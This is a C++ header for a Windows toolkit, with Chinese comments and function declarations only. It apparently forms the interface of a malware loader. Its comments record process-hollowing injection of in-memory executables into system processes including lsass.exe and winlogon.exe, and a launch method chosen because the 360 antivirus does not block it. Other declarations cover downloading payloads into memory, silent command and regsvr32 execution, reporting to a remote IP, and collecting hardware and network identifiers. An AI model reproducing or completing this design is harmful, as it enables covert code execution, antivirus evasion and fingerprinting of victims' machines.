#pragma once
#include <WS2TCPIP.H> //传输层(TCP/UDP/IP)
#include <WinInet.h> //应用层(HTTP/FTP)
//#include <WinHttp.h> //应用层(HTTP)
#include <Windows.h>
#include <string>
using namespace std;
#define MY_DEBUG

//使用系统进程（如svchost.exe）作为傀儡进程，远程注入
//x64编译，能将64位的exe，注入到64位的进程中OK（关闭360拦截）。
//	x64编译，将64位的exe，注入到32位的进程中ERROR（成功但无效果）。
//	x64编译，不能加载32位的exe，因为机器的位数不匹配（错误6Err6）
//x86编译，能将32位的exe，注入到32位的进程中OK（关闭360拦截）。
//	x86编译，将32位的exe，注入到64位的进程中ERROR（成功但无效果）。
//	x86编译，不能加载64位的exe，因为机器的位数不匹配（错误6Err6）
//int runExeFromMem(const char* data, long size, const string &host);
#define CMD_EXE "cmd.exe"
#define SVCHOST_EXE "svchost.exe" //N服务宿主OK
#define CONHOST_EXE "conhost.exe" //N命令行宿主OK
#define SIHOST_EXE "sihost.exe" //1外壳基础设施宿主OK
#define DASHOST_EXE "dasHost.exe" //1设备关联框架宿主OK
#define DLLHOST_EXE "dllHost.exe" //1动态链接库宿主OK
#define LSRSS_EXE "lsass.exe" //1本地安全权限子系统OK
#define SERVICES_EXE "services.exe" //1服务系统Err10
//#define CSRSS_EXE "csrss.exe" //1C/S运行时子系统Err0
//#define SMSS_EXE "smss.exe" //1会话管理子系统Err0
#define INIT_EXE "wininit.exe" //1初始化Err10
#define LOGON_EXE "winlogon.exe" //1登录注销OK
#define DWM_EXE "dwm.exe" //1桌面相关OK
#define EXPLORER_EXE "explorer.exe" //1资源管理器OK
#define CMD_PARAM_START " /c start "
#define CMD_REG_SVR "regsvr32 /s "

//内存操作操作--------------------------------
//创建一个包括大小写字母和数字的随机字符串
string createRandStr(int num = 8);
//找到字符，并且将它们删除掉，返回删除数量
int findAndRemove(string& str, char c);
//找到字符串search，并且将它的头部替换成replace
//找到并替换后，返回替换的位置，找不到则否则返回-1
int findAndReplace(char* buf, long len,
	const char* search, const char* replace);
//[node] item = value，cfgTxt是整个串，
//	node是[node],item是item，返回value
string getCfgItem(const string& cfgTxt,
	const string& node, const string& item);
//获取内存的MD5值: string MD5(const char input[], int len) 
string getMd5FromMem(const char input[], int len);
//获取文件的MD5值，失败时，返回""
string getMd5FromFile(const string& dirFile);
//内存解压，函数内部分配内存，返回长度或-1/2…
int unzipFromMem(const char in[], int len, char*& out);

//文件操作----------------------------------
//判断文件是否存在，存在返回true，否则返回false
bool fileExist(const string& dirFile);
//删除文件，成功时返回true，否则返回false
bool removeFile(const string& dirFile);
//将文件读取到内存中，函数内部分配内存，返回文件长度或-1
long readFile(const string& dirFile, char*& buf);
//将内存数据，写入到文件，成功返回true，否则返回false
bool writeFile(const string& dirFile, const char buf[], long bufLen);
//创建文件夹，成功时返回true，否则返回false
bool createDir(const string& dirPath);
//删除文件夹，成功时返回true，否则返回false
bool removeDir(const string& dirPath);

//网络操作------------------------------------
//获取网卡地址，失败时返回""
bool getMacAddr(string& addr);
//获取内网（局域网）IP地址，失败时返回""
bool getLocalIpAddr(string& addr);
//获取外网（互联网）IP地址，失败时返回""
bool getInternetIpAddr(string& addr);
//根据域名获取IP，成功则返回true
bool checkDomain(const string& str, string& result);
//下载文件到磁盘，成功则返回true，否则返回false
bool downloadFileToDisk(const string& url, const string& dirFile);
//下载文件到内存，函数内部分配内存，返回文件长度或-1/2…
long downloadFileToMem(const string& url, char*& buf);
//上报日志，成功则返回true，否则返回false
bool reportLog(const string& ip, short port, const string& data);

//系统操作-----------------------------------
//获取CPU ID
bool getCpuId(string& id);
//获取系统硬盘的序列号
bool getDriveSerial(string& ModelNo, string& SerialNo);
//获取系统的环境变量，比如"TEMP"，"APPDATA"
string getEnvVariable(const string& name);
//执行CMD命令行，成功则返回true，否则返回false
bool runCmdLine(const string& cmdStr);
//从文件运行EXE，成功则返回true，否则返回false
bool runExeFromFile(const string& dirFile);
//上面使用cmd启动360会拦截，下面这个则不会（推荐）
bool runExeFromFile2(const string& dirFile);
//从文件加载DLL，成功则返回true，否则返回false
bool loadDllFromFile(const string& dirFile);
//杀掉进程dwProcessId，删除文件dirFile，成功则返回true
bool killProcessAndRemoveFile(const string& dirFile);
//从内存运行EXE(傀儡进程注入)，成功则返回0，否则返回正整数
//host是被注入进程的文件路径，本函数会先用CreateProcessA创建进程
int runExeFromMem(const char* data, long size, const string& exeFile);
//从内存运行DLL，成功则返回0，否则返回正整数
bool loadDllFromMem(const char* data, long size);
//从文件加载DLL，成功则返回0，否则返回正整数
//host是被注入进程的名称，本函数会先用CreateProcessA创建线程
bool loadDllFromFile(const string& dllFile, const string& exeFile);

//其他函数-----------------------------------
//宽字符串和窄字符串的转换，内存在函数内部分配
PSTR ConvertWSTRtoSTR(PCWSTR pStrIn);
PWSTR ConvertSTRtoWSTR(PCSTR pStrIn);
PSTR ConvertTSTRtoSTR(PCTSTR pStrIn);
PTSTR ConvertSTRtoTSTR(PCSTR pStrIn);
//根据进程编号，获取进程名称，失败则返回""
string GetProcessNameById(int processId);
//根据进程名称，获取进程ID，失败则返回0
int GetProcessIdByName(string processName);
